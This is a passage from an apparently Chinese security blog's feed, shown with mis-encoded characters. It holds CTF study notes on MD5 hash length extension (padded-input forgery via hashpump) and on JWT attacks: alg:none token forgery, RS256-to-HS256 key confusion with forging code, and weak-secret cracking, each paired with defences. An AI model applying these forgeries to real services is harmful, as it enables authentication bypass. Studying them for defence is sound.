<code>$username</code>ã€‚<br><code>guest\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x01\x00\x00\x00\x00\x00\x00root</code><br>urlencodeä¹‹åä¸º<br><code>guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%28%01%00%00%00%00%00%00root</code><br>å¸¦å…¥encå‡½æ•°è¿”å›çš„å°±æ˜¯<code>md5($key+guest+root)</code>çš„å€¼ã€‚<br>ç„¶åæŠŠ<code>md5($key+guest)</code>å€¼ä½œä¸ºåŠ å¯†rootçš„åˆå§‹é“¾å˜é‡ã€‚</p><p>è¿™é‡ŒæŠŠåŸhashå€¼ï¼ˆ8b3dd2057d3216ca78bf31ede947c0e3ï¼‰æ‹†åˆ†ä¸ºå››ç»„ï¼Œå³ä¸ºï¼š</p><p><code>8b3dd205</code>,<code>7d3216ca</code>,<code>78bf31ed</code>,<code>e947c0e3</code></p><p>åœ¨æ­¤å°†å››ç»„æ•°å€¼æŒ‰ç…§å°ç«¯è§„åˆ™ååºï¼Œå¯å¾—å¦‚ä¸‹å››ç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x05d23d8b</span><br><span class="line">B=0xca16327d</span><br><span class="line">C=0xed31bf78</span><br><span class="line">D=0xe3c047e9</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/hash_attack7.png" alt></p><p>ç„¶åç”¨hashpumpè·‘ä¸€ä¸‹ï¼Œå¾—å‡ºäº†md5çš„å€¼ä¸º<code>dca0083ab43d715a2eb8be1949b77469</code>ï¼Œç„¶åæ”¾å…¥cookieä¸­å¾—åˆ°flag</p><p><img src="http://images.xianyu123.club/hash_attack8.png" alt></p><h2 id="CTFä¸­çš„å°æŠ€å·§"><a href="#CTFä¸­çš„å°æŠ€å·§" class="headerlink" title="CTFä¸­çš„å°æŠ€å·§"></a>CTFä¸­çš„å°æŠ€å·§</h2><p>ç”¨hashpump</p><p>Input Signature: è¿™é‡Œå†™åŸå§‹çš„md5ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„verify<br>Input Data: è¿™é‡Œå†™åŸå§‹çš„å€¼ï¼Œä¹Ÿå°±æ˜¯<code>md5($key.$text);</code>ä¸<code>$key</code>æ‹¼æ¥çš„åé¢çš„é‚£ä¸²å€¼<code>$text</code><br>Input Key Length: è¿™é‡Œå†™keyçš„é•¿åº¦<br>Input Data to Add: è¿™é‡Œå†™ä½ æƒ³è¦çš„textçš„å€¼ï¼Œæ¯”å¦‚è¿™é‡Œ<code>md5($key.&#39;admin&#39;);</code>ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¡«å†™<code>admin</code></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ol><li>å¯ä»¥å°†æ¶ˆæ¯æ‘˜è¦çš„å€¼å†è¿›è¡Œæ¶ˆæ¯æ‘˜è¦ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ç”¨æˆ·æ§åˆ¶messageäº†ã€‚ä¹Ÿå°±æ˜¯<a href="https://en.wikipedia.org/wiki/HMAC" target="_blank" rel="noopener">HMAC</a>ç®—æ³•ã€‚è¯¥ç®—æ³•å¤§æ¦‚æ¥è¯´æ˜¯è¿™æ ·ï¼š<code>MAC =hash(secret + hash(secret + message))</code>ï¼Œè€Œä¸æ˜¯ç®€å•çš„å¯¹å¯†é’¥è¿æ¥messageä¹‹åçš„å€¼è¿›è¡Œå“ˆå¸Œæ‘˜è¦ã€‚å…·ä½“HMACçš„å·¥ä½œåŸç†æœ‰äº›å¤æ‚ï¼Œä½†ä½ å¯ä»¥æœ‰ä¸ªå¤§æ¦‚çš„äº†è§£ã€‚é‡ç‚¹æ˜¯ï¼Œç”±äºè¿™ç§ç®—æ³•è¿›è¡Œäº†åŒé‡æ‘˜è¦ï¼Œå¯†é’¥ä¸å†å—æœ¬æ–‡ä¸­çš„é•¿åº¦æ‰©å±•æ”»å‡»å½±å“ã€‚HMACæœ€å…ˆæ˜¯åœ¨1996å¹´è¢«å‘è¡¨ï¼Œä¹‹åå‡ ä¹è¢«æ·»åŠ åˆ°æ¯ä¸€ç§ç¼–ç¨‹è¯­è¨€çš„æ ‡å‡†å‡½æ•°åº“ä¸­ã€‚</li><li>å°†secretæ”¾ç½®åœ¨æ¶ˆæ¯æœ«å°¾ä¹Ÿèƒ½é˜²æ­¢è¿™ç§æ”»å‡»ã€‚æ¯”å¦‚ hash(m+secret)ï¼Œå¸Œæœ›æ¨å¯¼å‡º hash(m + secret||padding||mâ€™)ï¼Œç”±äºè‡ªåŠ¨é™„åŠ secretåœ¨æœ«å°¾çš„å…³ç³»ï¼Œä¼šå˜æˆhash(m||padding||mâ€™||secret)ã€‚ç°åœ¨çš„é™„åŠ å€¼å¯ä»¥çœ‹ä½œæ˜¯mâ€™||secretï¼Œsecretå€¼ä¸çŸ¥é“ï¼Œä»è€Œå¯¼è‡´é™„åŠ å­—ç¬¦ä¸²ä¸å¯æ§ï¼Œhashå€¼ä¹Ÿå°±ä¸å¯æ§ï¼Œå› è€Œé˜²æ­¢äº†è¿™ç§æ”»å‡»ã€‚</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">hashå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»è§£æï¼ˆè®°å½•ä¸€ä¸‹ï¼Œä¿è¯ä¸å¿˜ï¼‰</a></li><li><a href="https://www.smi1e.top/hello-world/" target="_blank" rel="noopener">Hashé•¿åº¦æ‰©å±•æ”»å‡»</a></li><li><a href="https://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="noopener">ç”¨MD5å®ç°hashé•¿åº¦æ‰©å±•æ”»å‡» By Assassin</a></li><li><a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»(Hash Length Extension Attacks)</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™æ¬¡å›½èµ›é‡åˆ°äº†è¿™ä¸ªæ¼æ´ï¼Œä»¥å‰çœ‹è¿‡è¿™ä¸ªæ¼æ´ï¼Œä½†æ²¡æœ‰åƒé€å¯¼è‡´è¿™æ¬¡å›½èµ›æ²¡åšå‡ºæ¥ï¼Œè¿™æ¬¡å‡†å¤‡å¥½å¥½ç ”ç©¶ä¸€ä¸‹ï¼Œå†™ä¸‹è¿™ç¯‡å­¦ä¹ ç¬”è®°&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>JWT(JSON Web Token) æ”»å‡»</title>
    <link href="http://0clickjacking0.github.io/2019/07/09/JWT-JSON-Web-Token-%E6%94%BB%E5%87%BB/"/>
    <id>http://0clickjacking0.github.io/2019/07/09/JWT-JSON-Web-Token-æ”»å‡»/</id>
    <published>2019-07-09T04:26:13.000Z</published>
    <updated>2019-07-09T11:22:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘è¿™æ¬¡å›½èµ›é‡åˆ°äº†json web tokençš„é¢˜ç›®ï¼Œå‘ç°å¹¶ä¸èƒ½å¾ˆé¡ºåˆ©çš„åšå‡ºæ¥ï¼Œäºæ˜¯å†™ä¸‹è¿™ç¯‡å­¦ä¹ ç¬”è®°</p><a id="more"></a><h1 id="ä»€ä¹ˆæ˜¯JWT"><a href="#ä»€ä¹ˆæ˜¯JWT" class="headerlink" title="ä»€ä¹ˆæ˜¯JWT"></a>ä»€ä¹ˆæ˜¯JWT</h1><p>JSON Web Tokenï¼ˆJWTï¼‰æ˜¯ä¸€ä¸ªéå¸¸è½»å·§çš„è§„èŒƒã€‚è¿™ä¸ªè§„èŒƒå…è®¸æˆ‘ä»¬ä½¿ç”¨JWTåœ¨ä¸¤ä¸ªç»„ç»‡ä¹‹é—´ä¼ é€’å®‰å…¨å¯é çš„ä¿¡æ¯ã€‚</p><p>ç°åœ¨ç½‘ä¸Šå¤§å¤šæ•°ä»‹ç»JWTçš„æ–‡ç« å®é™…ä»‹ç»çš„éƒ½æ˜¯JWS(JSON Web Signature),ä¹Ÿå¾€å¾€å¯¼è‡´äº†äººä»¬å¯¹äºJWTçš„è¯¯è§£ï¼Œä½†æ˜¯JWTå¹¶ä¸ç­‰äºJWSï¼ŒJWSåªæ˜¯JWTçš„ä¸€ç§å®ç°ï¼Œé™¤äº†JWSå¤–ï¼ŒJWE(JSON Web Encryption)ä¹Ÿæ˜¯JWTçš„ä¸€ç§å®ç°ã€‚</p><h1 id="JWTçš„ç»„æˆ"><a href="#JWTçš„ç»„æˆ" class="headerlink" title="JWTçš„ç»„æˆ"></a>JWTçš„ç»„æˆ</h1><p>æˆ‘ä»¬éšä¾¿æ¥çœ‹ä¸€ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ.GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure><p>JWTçš„æ ¼å¼éå¸¸ç®€å•</p><p>JWTçš„æ•°æ®åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š <code>headers</code> , <code>payloads</code>ï¼Œ<code>signature(ç­¾å)</code></p><p>ä¸‰è€…é€šè¿‡<code>.</code>åˆ†å‰²ï¼Œå‡é‡‡ç”¨<code>base64ç¼–ç </code></p><h2 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"></span><br><span class="line">è§£ç åä¸ºï¼š</span><br><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>algä¸ºç®—æ³•çš„ç¼©å†™ï¼Œtypä¸ºç±»å‹çš„ç¼©å†™ï¼Œæœ‰æ—¶å€™è¿˜ä¼šæœ‰kidï¼Œkidè¡¨ç¤ºç®—æ³•æ‰€ä½¿ç”¨çš„å¯†é’¥æ–‡ä»¶ï¼ˆå½“æœåŠ¡ç«¯éœ€è¦å¤šä¸ªå¯†é’¥æ–‡ä»¶æ—¶ä½¿ç”¨ï¼‰</p><h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ</span><br><span class="line"></span><br><span class="line">è§£ç åä¸ºï¼š</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;hello&quot;,</span><br><span class="line">  &quot;iat&quot;: 1562504918,</span><br><span class="line">  &quot;exp&quot;: 1562504923,</span><br><span class="line">  &quot;account&quot;: &quot;kk&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªå­—æ®µçš„å«ä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­éœ€è¦æ³¨æ„çš„å­—æ®µæ˜¯expï¼Œè¿™å­—æ®µå¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šè¢«ç”¨æ¥é˜²æ­¢é‡æ”¾æ”»å‡»</p><p>iss(issuer)ï¼šå‘å¸ƒè€…çš„urlåœ°å€</p><p>sub(subject)ï¼šè¯¥JWTæ‰€é¢å‘çš„ç”¨æˆ·ï¼Œç”¨äºå¤„ç†ç‰¹å®šåº”ç”¨ï¼Œä¸æ˜¯å¸¸ç”¨çš„å­—æ®µ</p><p>aud(audience)ï¼šæ¥å—è€…çš„urlåœ°å€</p><p>exp(expiration)ï¼šè¯¥jwté”€æ¯çš„æ—¶é—´ï¼›unixæ—¶é—´æˆ³</p><p>nbf(not before)ï¼šè¯¥jwtçš„ä½¿ç”¨æ—¶é—´ä¸èƒ½æ—©äºè¯¥æ—¶é—´ï¼›unixæ—¶é—´æˆ³</p><p>iat(issued at)ï¼šè¯¥jwtçš„å‘å¸ƒæ—¶é—´ï¼›unix æ—¶é—´æˆ³</p><p>jti(JWT ID)ï¼šè¯¥jwtçš„å”¯ä¸€IDç¼–å·</p><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure><p>å› ä¸ºheaderå’Œpayloadæ˜¯æ˜æ–‡å­˜å‚¨çš„ï¼Œæ‰€ä»¥ç­¾åæ˜¯ä¸ºäº†é˜²æ­¢æ•°æ®è¢«ä¿®æ”¹çš„ï¼Œæä¾›äº†å¯¹æ•°æ®çš„äº¤æ˜“åŠŸèƒ½<br>ç­¾åå¸¸ä½¿ç”¨RS256(RSA éå¯¹ç§°åŠ å¯†ï¼Œä½¿ç”¨ç§é’¥ç­¾å)ã€HS256(HMAC SHA256 å¯¹ç§°åŠ å¯†)ç®—æ³•ï¼Œç­¾åå¯¹è±¡ä¸ºbase64encode(headers) + â€˜.â€™ + base64encode(payloads)</p><h1 id="æ”»å‡»JWT"><a href="#æ”»å‡»JWT" class="headerlink" title="æ”»å‡»JWT"></a>æ”»å‡»JWT</h1><h2 id="1-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#1-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="1. æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>1. æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>å¾ˆæ˜æ˜¾çš„ä¸€ç‚¹ï¼Œå› ä¸ºpayloadæ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œæ‰€ä»¥å¦‚æœpayloadä¸­å­˜åœ¨æ•æ„Ÿä¿¡æ¯å°±ä¼šå‡ºç°ä¿¡æ¯æ³„éœ²ã€‚å½“æœåŠ¡ç«¯çš„ç§˜é’¥æ³„å¯†çš„æ—¶å€™ï¼ŒJWTçš„ä¼ªé€ å°±å˜å¾—éå¸¸ç®€å•å®¹æ˜“ã€‚å¯¹æ­¤ï¼ŒæœåŠ¡ç«¯åº”è¯¥å¦¥å–„ä¿ç®¡å¥½ç§é’¥ï¼Œä»¥å…è¢«ä»–äººçªƒå–ã€‚</p><h2 id="2-ä¿®æ”¹ç®—æ³•ä¸ºnone"><a href="#2-ä¿®æ”¹ç®—æ³•ä¸ºnone" class="headerlink" title="2. ä¿®æ”¹ç®—æ³•ä¸ºnone"></a>2. ä¿®æ”¹ç®—æ³•ä¸ºnone</h2><p>ç­¾åç®—æ³•ä¿è¯äº†JWTåœ¨ä¼ è¾“çš„è¿‡ç¨‹ä¸­ä¸è¢«æ¶æ„ç”¨æˆ·ä¿®æ”¹</p><p>ä½†æ˜¯headerä¸­çš„algå­—æ®µå¯è¢«ä¿®æ”¹ä¸ºnone</p><p>ä¸€äº›JWTåº“æ”¯æŒnoneç®—æ³•ï¼Œå³æ²¡æœ‰ç­¾åç®—æ³•ï¼Œå½“algä¸ºnoneæ—¶åç«¯ä¸ä¼šè¿›è¡Œç­¾åæ ¡éªŒ</p><p>å°†algä¿®æ”¹ä¸ºnoneåï¼Œå»æ‰JWTä¸­çš„signatureæ•°æ®ï¼ˆä»…å‰©header + â€˜.â€™ + payload + â€˜.â€™ï¼‰ç„¶åæäº¤åˆ°æœåŠ¡ç«¯å³å¯</p><p>è¿™ç§æ”»å‡»çš„ä¾‹å­å¯ä»¥å‚è€ƒï¼š<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>ä»£ç å¯ä»¥åœ¨Githubä¸Šæ‰¾åˆ° <a href="https://github.com/Sjord/jwtdemo/" target="_blank" rel="noopener">https://github.com/Sjord/jwtdemo/</a></p><p>è¿™ä¸ªä¾‹å­çš„è§£æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŸheaders:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="comment"># è§£ç å:&#123;"typ": "JWT","alg": "HS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸpayloadsï¼šeyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2MjkyNSwiZXhwIjoxNTYyNjYzMDQ1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># è§£ç å:&#123; "iss": "http://demo.sjoerdlangkemper.nl/", "iat": 1562662925,"exp": 1562663045,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°æ„é€ æ–°çš„</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">headers = <span class="string">"&#123;\"typ\":\"JWT\",\"alg\":\"none\"&#125;"</span></span><br><span class="line">payloads = <span class="string">"&#123;\"data\":\"test\"&#125;"</span></span><br><span class="line">bytesHeaders = headers.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodeHead = base64.b64encode(bytesHeaders)</span><br><span class="line">bytesPay = payloads.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodePay = base64.b64encode(bytesPay)</span><br><span class="line">print( encodeHead.decode()+ <span class="string">'.'</span> +encodePay.decode() + <span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p>å¦‚ä½•æŠŠå¾—å‡ºçš„å€¼ä¼ å…¥åˆ°å¯æ§çš„å‚æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°<code>alg</code>å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹æˆäº†<code>none</code></p><p><img src="http://images.xianyu123.club/JWT1.png" alt></p><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><ol><li><p>ä¸å…è®¸å‡ºç° none çš„æ–¹æ³•ï¼›</p></li><li><p>å°†å¼€å¯ alg : none ä½œä¸ºä¸€ç§é¢å¤–çš„é…ç½®é€‰é¡¹ã€‚</p></li></ol><h2 id="3-å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•-gt-å¯¹ç§°å¯†ç ç®—æ³•ï¼‰"><a href="#3-å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•-gt-å¯¹ç§°å¯†ç ç®—æ³•ï¼‰" class="headerlink" title="3. å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•=&gt;å¯¹ç§°å¯†ç ç®—æ³•ï¼‰"></a>3. å°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•=&gt;å¯¹ç§°å¯†ç ç®—æ³•ï¼‰</h2><p>ç®—æ³•HS256ä½¿ç”¨ç§˜å¯†å¯†é’¥å¯¹æ¯æ¡æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚</p><p>ç®—æ³•RS256ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡ŒéªŒè¯ã€‚</p><p>å¦‚æœå°†ç®—æ³•ä»RS256æ›´æ”¹ä¸ºHS256ï¼Œåç«¯ä»£ç ä¼šä½¿ç”¨å…¬é’¥ä½œä¸ºç§˜å¯†å¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚</p><p>ç”±äºå…¬é’¥æœ‰æ—¶å¯ä»¥è¢«æ”»å‡»è€…è·å–åˆ°ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ä¿®æ”¹headerä¸­ç®—æ³•ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚</p><p>åç«¯ä»£ç ä¼šä½¿ç”¨RSAå…¬é’¥+HS256ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ã€‚</p><p>åŒæ ·çš„ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ç†è§£è¿™ç§æ”»å‡»æ–¹å¼ <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p><p>RSAå…¬é’¥ï¼š<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p>è¿™ä¸ªä¾‹å­çš„è§£æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŸheaders:eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span></span><br><span class="line"><span class="comment"># è§£ç å:&#123;"typ": "JWT", "alg": "RS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸpayloadsï¼šeyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2NzkwMSwiZXhwIjoxNTYyNjY4MDIxLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># è§£ç å:&#123;"iss": "http://demo.sjoerdlangkemper.nl/","iat": 1562667901,"exp": 1562668021,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°æ„é€ ï¼š</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># public.pemä»ä¸Šé¢çš„å…¬é’¥åœ°å€ä¸‹è½½ï¼Œä¸€èˆ¬ctfæ¯”èµ›ä¸­éƒ½ä¼šæœ‰å…¬é’¥æ³„æ¼å¯ä»¥ä¸‹è½½çš„</span></span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure><p>å¦‚æœé‡åˆ°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure><p>è§£å†³å¦‚ä¸‹ï¼š</p><p><code>pip3 install pyjwt==0.4.3</code></p><p>å¦‚ä½•æŠŠå¾—å‡ºçš„å€¼ä¼ å…¥åˆ°å¯æ§çš„å‚æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç»•è¿‡äº†<code>RS256</code>ç®—æ³•ï¼ŒæŠŠå®ƒå˜æˆäº†<code>HS256</code>ç®—æ³•ï¼Œä¸”æ•°æ®å¯æ§</p><p><img src="http://images.xianyu123.club/JWT2.png" alt></p><h2 id="4-HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£"><a href="#4-HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£" class="headerlink" title="4. HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£"></a>4. HS256ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰å¯†é’¥ç ´è§£</h2><p>å¦‚æœHS256å¯†é’¥å¼ºåº¦è¾ƒå¼±ï¼Œåˆ™å¯ä»¥ç›´æ¥å¼ºåˆ¶ä½¿ç”¨ï¼Œé€šè¿‡çˆ†ç ´ HS256çš„ç§˜é’¥å¯ä»¥å®Œæˆè¯¥æ“ä½œã€‚éš¾åº¦æ¯”è¾ƒä½ã€‚</p><p>ç ´è§£å·¥å…·<a href="https://github.com/brendan-rius/c-jwt-cracker*" target="_blank" rel="noopener">c-jwt-cracker</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTYyNTA0OTE4LCJleHAiOjE1NjI1MDQ5MjMsImFjY291bnQiOiJrayJ9.CJcfvv6JbajrhNriA2-Hb_2yYCUy5aeAvUjVzdgBytw</span><br></pre></td></tr></table></figure><h3 id="é˜²å¾¡-1"><a href="#é˜²å¾¡-1" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><p>ä½¿ç”¨å¤æ‚çš„ç§˜é’¥å³å¯</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.jianshu.com/p/50ade6f2e4fd" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ åˆ†æ¸…æ¥šJWT,JWSä¸JWE</a></li><li><p><a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">Json Web Tokenå†é™©è®°</a></p></li><li><p><a href="https://www.cnblogs.com/dliv3/p/7450057.html" target="_blank" rel="noopener">Hacking JWT(JSON Web Token)</a></p></li><li><p><a href="https://xz.aliyun.com/t/2338" target="_blank" rel="noopener">JSON Web Token (JWT) æ”»å‡»æŠ€å·§</a></p></li><li><a href="https://www.freebuf.com/articles/web/180874.html" target="_blank" rel="noopener">æ·±å…¥äº†è§£Json Web Tokenä¹‹æ¦‚å¿µç¯‡</a></li><li><a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">æ·±å…¥äº†è§£Json Web Tokenä¹‹å®æˆ˜ç¯‡</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘è¿™æ¬¡å›½èµ›é‡åˆ°äº†json web tokençš„é¢˜ç›®ï¼Œå‘ç°å¹¶ä¸èƒ½å¾ˆé¡ºåˆ©çš„åšå‡ºæ¥ï¼Œäºæ˜¯å†™ä¸‹è¿™ç¯‡å­¦ä¹ ç¬”è®°&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>macä¸‹å®‰è£…å¤šç‰ˆæœ¬phpå’Œé…ç½®php-fpmçš„ä¸€äº›å‘</title>
    <link href="http://0clickjacking0.github.io/2019/05/28/mac%E4%B8%8B%E5%AE%89%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%92%8C%E9%85%8D%E7%BD%AEphp-fpm%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>http://0clickjacking0.github.io/2019/05/28/macä¸‹å®‰è£…å¤šç‰ˆæœ¬phpå’Œé…ç½®php-fpmçš„ä¸€äº›å‘/</id>
    <published>2019-05-28T11:01:50.000Z</published>
    <updated>2020-01-16T09:26:38.767Z</updated>
    
